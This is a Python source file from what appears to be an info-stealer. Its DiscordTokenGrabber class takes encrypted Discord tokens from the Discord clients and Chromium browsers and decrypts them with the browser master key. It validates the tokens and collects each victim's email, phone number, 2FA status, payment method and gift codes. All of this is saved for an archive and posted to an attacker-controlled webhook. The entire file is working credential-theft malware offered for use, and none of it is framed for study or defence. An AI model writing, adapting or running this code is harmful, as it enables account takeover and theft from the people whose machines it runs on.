# discord.py (VERSION CORRIGÉE & FONCTIONNELLE – 0 ERREURS)
import os
import re
import base64
import json
import requests
from datetime import datetime
from Crypto.Cipher import AES
from utils import get_master_key
from config import WEBHOOK_URL, CHROMIUM_BROWSERS


# ==================== EMOJIS (change-les si tu veux) ====================
EMOJIS = {
    "nitro": "Nitro",
    "phone": "Telephone",
    "mail": "Email",
    "key": "Key",
    "lock": "Lock",
    "globe": "Globe",
    "cc": "Credit Card",
    "codes": "Gift",
    "badges": "Badges",
    "staff": "Staff",
    "partner": "Partner",
    "hypesquad": "HypeSquad",
    "bughunter1": "Bug Hunter",
    "bughunter2": "Bug Hunter Gold",
    "bravery": "Bravery",
    "brilliance": "Brilliance",
    "balance": "Balance",
    "early": "Early Supporter",
    "early_developer": "Early Dev",
    "developer": "Verified Dev",
    "nitro_basic": "Nitro Classic",
    "nitro_boost": "Nitro Boost",
}


class DiscordTokenGrabber:
    def __init__(self, dumper):
        self.dumper = dumper
        self.roaming = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.tokens = []
        self.valid_tokens = []

    # ====================== DÉCRYPTAGE ======================
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
        except:
            return None

    def check_token(self, token):
        if not token or len(token) < 50:
            return False
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                           headers={"Authorization": token}, timeout=8)
            return r.status_code == 200
        except:
            return False

    # ====================== LEVELDB DISCORD ======================
    def extract_from_leveldb(self, path):
        if not os.path.exists(path):
            return
        for file in os.listdir(path):
            if not file.endswith((".ldb", ".log")):
                continue
            fp = os.path.join(path, file)
            try:
                with open(fp, "rb") as f:
                    content = f.read()
                found = re.findall(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}', content)
                found += re.findall(rb'mfa\.[\w-]{84}', content)
                for t in found:
                    token = t.decode('utf-8', errors='ignore')
                    if token not in self.tokens:
                        self.tokens.append(token)
            except:
                pass

    def extract_encrypted_tokens(self, leveldb_path, local_state_path):
        if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
            return
        master_key = get_master_key(local_state_path)
        if not master_key:
            return
        for file in os.listdir(leveldb_path):
            if not file.endswith((".ldb", ".log")):
                continue
            fp = os.path.join(leveldb_path, file)
            try:
                with open(fp, "rb") as f:
                    content = f.read()
                matches = re.findall(rb'dQw4w9WgXcQ:([^"\\]{40,})', content)
                for m in matches:
                    try:
                        buff = base64.b64decode(m)
                        token = self.decrypt_val(buff, master_key)
                        if token and token not in self.tokens:
                            self.tokens.append(token)
                    except:
                        pass
            except:
                pass

    # ====================== NAVIGATEURS CHROMIUM ======================
    def extract_browser_tokens(self):
        for browser in CHROMIUM_BROWSERS:
            base_path = os.path.expandvars(browser["base"])
            if not os.path.exists(base_path):
                continue

            profiles = []
            try:
                for item in os.listdir(base_path):
                    profile_path = os.path.join(base_path, item)
                    if os.path.isdir(profile_path):
                        leveldb = os.path.join(profile_path, "Local Storage", "leveldb")
                        if os.path.exists(leveldb):
                            profiles.append((item, profile_path))
            except:
                pass

            default_leveldb = os.path.join(base_path, "Default", "Local Storage", "leveldb")
            if os.path.exists(default_leveldb):
                profiles.append(("Default", os.path.join(base_path, "Default")))

            local_state = browser.get("state")
            if not local_state:
                continue
            local_state = os.path.expandvars(local_state)
            if not os.path.exists(local_state):
                continue

            master_key = get_master_key(local_state)
            if not master_key:
                continue

            for profile_name, profile_path in profiles:
                leveldb_path = os.path.join(profile_path, "Local Storage", "leveldb")
                if not os.path.exists(leveldb_path):
                    continue

                for file in os.listdir(leveldb_path):
                    if not file.endswith((".ldb", ".log")):
                        continue
                    fp = os.path.join(leveldb_path, file)
                    try:
                        with open(fp, "rb") as f:
                            content = f.read()
                        matches = re.findall(rb'dQw4w9WgXcQ:([^"\\]{40,})', content)
                        for m in matches:
                            try:
                                buff = base64.b64decode(m)
                                token = self.decrypt_val(buff, master_key)
                                if token and token not in self.tokens:
                                    self.tokens.append(token)
                            except:
                                pass
                    except:
                        pass

    # ====================== GRAB TOKENS ======================
    def grab_tokens(self):

        paths = [
            f"{self.roaming}\\discord",
            f"{self.roaming}\\discordcanary",
            f"{self.roaming}\\discordptb",
            f"{self.roaming}\\discorddevelopment",
            f"{self.localappdata}\\Discord",
            f"{self.localappdata}\\DiscordCanary",
            f"{self.localappdata}\\DiscordPTB",
        ]

        for base_path in paths:
            if not os.path.exists(base_path):
                continue
            leveldb = os.path.join(base_path, "Local Storage", "leveldb")
            local_state = os.path.join(base_path, "Local State")
            if os.path.exists(leveldb):
                self.extract_from_leveldb(leveldb)
                self.extract_encrypted_tokens(leveldb, local_state)

        self.extract_browser_tokens()

        self.tokens = list(set(self.tokens))
        for token in self.tokens[:]:
            if self.check_token(token):
                self.valid_tokens.append(token)

    # ====================== UTILITAIRES ======================
    def discord_id_to_date(self, discord_id):
        try:
            timestamp = ((int(discord_id) >> 22) + 1420070400000) / 1000
            return datetime.utcfromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
        except:
            return "Inconnu"

    def get_nitro_status(self, premium_type):
        if premium_type == 1: return f"{EMOJIS['nitro']} {EMOJIS['nitro_basic']}"
        if premium_type == 2: return f"{EMOJIS['nitro']} {EMOJIS['nitro_boost']}"
        return "`Aucun`"

    def get_badges(self, flags):
        if not flags:
            return "`Aucun`"
        badge_map = {
            1<<0: EMOJIS['staff'],
            1<<1: EMOJIS['partner'],
            1<<2: EMOJIS['hypesquad'],
            1<<3: EMOJIS['bughunter1'],
            1<<6: EMOJIS['bravery'],
            1<<7: EMOJIS['brilliance'],
            1<<8: EMOJIS['balance'],
            1<<9: EMOJIS['early'],
            1<<14: EMOJIS['bughunter2'],
            1<<17: EMOJIS['early_developer'],
            1<<22: EMOJIS['developer'],
        }
        badges = [v for k, v in badge_map.items() if flags & k]
        return " ".join(badges) if badges else "`Aucun`"

    def get_billing(self, token):
        try:
            r = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources",
                           headers={"Authorization": token}, timeout=8)
            if r.status_code == 200 and r.json():
                return "`Carte`" if any(p.get("type") == 1 for p in r.json()) else "`PayPal`"
        except:
            pass
        return "`Aucun`"

    def get_gift_codes(self, token):
        codes = ""
        try:
            headers = {"Authorization": token}
            r = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers, timeout=6)
            if r.status_code == 200:
                for c in r.json():
                    if c.get("code"):
                        codes += f"`{c['code']}` - **{c['promotion']['outbound_title']}**\n"
            r = requests.get("https://discord.com/api/v9/users/@me/entitlements/gifts", headers=headers, timeout=6)
            if r.status_code == 200:
                for g in r.json():
                    if g.get("code"):
                        codes += f"`https://discord.gift/{g['code']}`\n"
        except:
            pass
        return codes.strip() or "`Aucun`"

    # ====================== SAUVEGARDE FICHIER TEXTE ======================
    def save_to_file(self):
        if not self.valid_tokens:
            return

        lines = ["=" * 70,
                 f" DISCORD TOKENS - {len(self.valid_tokens)} valides",
                 "=" * 70, ""]

        for i, token in enumerate(self.valid_tokens, 1):
            try:
                user = requests.get("https://discord.com/api/v10/users/@me",
                                  headers={"Authorization": token}, timeout=8).json()
            except:
                user = {}

            lines += [
                f"--- TOKEN {i} ---",
                f"[COMPTE] {user.get('username','?')}#{user.get('discriminator','0000')} ({user.get('id','?')})",
                f"[TOKEN] {token}",
                f"[EMAIL] {user.get('email', 'Inconnu')}",
                f"[TÉLÉPHONE] {user.get('phone', 'Inconnu')}",
                f"[NITRO] {self.get_nitro_status(user.get('premium_type'))}",
                f"[2FA] {'Oui' if user.get('mfa_enabled') else 'Non'}",
                f"[BADGES] {self.get_badges(user.get('public_flags', 0))}",
                f"[PAIEMENT] {self.get_billing(token)}",
                f"[CRÉÉ LE] {self.discord_id_to_date(user.get('id', '0'))}",
                ""
            ]

        content = "\n".join(lines)
        self.dumper.save("discord_tokens.txt", content, "Discord")

    # ====================== ENVOI EMBEDS WEBHOOK ======================
    def send_embeds(self, gofile_url=None):
        if not self.valid_tokens or not WEBHOOK_URL:
            return

        for token in self.valid_tokens:
            try:
                headers = {"Authorization": token}
                user = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10).json()

                avatar = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar') or '0'}.png?size=256"

                embed = {
                    "title": f"{user['username']}#{user['discriminator']} • {user['id']}",
                    "color": 0x8f00ff,
                    "thumbnail": {"url": avatar},
                    "fields": [
                        {"name": f"Token", "value": f"```{token}```", "inline": False},
                        {"name": f"Email", "value": f"`{user.get('email', 'Non vérifié')}`", "inline": True},
                        {"name": f"Téléphone", "value": f"`{user.get('phone', 'Aucun')}`", "inline": True},
                        {"name": f"Créé le", "value": f"`{self.discord_id_to_date(user['id'])}`", "inline": True},
                        {"name": f"Nitro", "value": self.get_nitro_status(user.get('premium_type')), "inline": True},
                        {"name": f"2FA", "value": "`Oui`" if user.get('mfa_enabled') else "`Non`", "inline": True},
                        {"name": f"Badges", "value": self.get_badges(user.get('public_flags', 0)), "inline": False},
                        {"name": f"Paiement", "value": self.get_billing(token), "inline": True},
                        {"name": f"Codes cadeaux", "value": self.get_gift_codes(token), "inline": False},
                    ],
                    "footer": {"text": "Efilop • Zakura "},
                    "timestamp": datetime.utcnow().isoformat()
                }

                if gofile_url:
                    embed["fields"].append({
                        "name": "Archive complète",
                        "value": f"[Télécharger ici]({gofile_url})",
                        "inline": False
                    })

                requests.post(WEBHOOK_URL, json={
                    "username": "Lol",
                    "avatar_url": "https://i.imgur.com/4qRELaE.png",
                    "embeds": [embed]
                }, timeout=15)

            except Exception as e:
                continue  # passe au token suivant si erreur

    # ====================== FONCTION PRINCIPALE ======================
    def run(self, gofile_url=None):
        self.grab_tokens()
        self.save_to_file()          # → dans le ZIP
        self.send_embeds(gofile_url=gofile_url)  # → sur ton webhook